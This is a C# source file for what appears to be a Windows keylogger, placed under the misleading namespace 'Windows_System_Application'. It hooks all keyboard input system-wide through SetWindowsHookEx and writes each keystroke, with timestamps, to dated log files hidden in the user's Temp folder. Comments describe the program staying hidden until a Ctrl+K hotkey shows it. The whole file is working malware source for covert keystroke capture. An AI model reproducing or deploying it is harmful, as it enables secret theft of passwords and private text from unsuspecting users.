using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Windows_System_Application.source
{
    public struct ConfigLogFile
    {
        private static string userProfilePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); //%USERPROFILE%
        public static string rootLogSave = $@"{userProfilePath}\AppData\Local\Temp\Logg";
        public static string logName = "Log_";
        public static string logExtendtion = ".txt";

    }


    internal class HookKeyBoard
    {
        #region hook key board
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static DateTime? _lastUpdateTime;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        /// <summary>
        /// Every time the OS call back pressed key. Catch them 
        /// then cal the CallNextHookEx to wait for the next key
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                //CheckHotKey(vkCode);
                WriteLog(vkCode);

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Write pressed key into log.txt file
        /// </summary>
        /// <param name="vkCode"></param>
        static void WriteLog(int vkCode)
        {
            Console.WriteLine((Keys)vkCode);
            DateTime dateTime = DateTime.Now;

            string directoryy = $"{ConfigLogFile.rootLogSave}\\{dateTime.ToLongDateString()}\\";
            if (!Directory.Exists(directoryy))
            {
                Directory.CreateDirectory(directoryy);
            }
            string logNameToWrite = directoryy + ConfigLogFile.logName + ConfigLogFile.logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            //write time if _lastUpdateTime.Minute != dateTime.Minute
            if (_lastUpdateTime == null || _lastUpdateTime.Value.Minute != dateTime.Minute)
            {
                sw.WriteLine();
                sw.WriteLine(dateTime.ToLongTimeString() + ": ");
                _lastUpdateTime = dateTime;
            }
            sw.Write((Keys)vkCode);
            sw.Close();
        }

        /// <summary>
        /// Start hook key board and hide the key logger
        /// Key logger only show again if pressed right Hot key
        /// </summary>
        public static void run()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        static bool isHotKey = false;
        static bool isShowing = false;
        static Keys previoursKey = Keys.Separator;

        static void CheckHotKey(int vkCode)
        {
            //ctrl + K
            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
                isHotKey = true;

            if (isHotKey)
            {
                if (!isShowing)
                {
                    Windows.DisplayWindow();
                }
                else
                    Windows.HideWindow();

                isShowing = !isShowing;
            }

            previoursKey = (Keys)vkCode;
            isHotKey = false;
        }
        #endregion      
    }
}
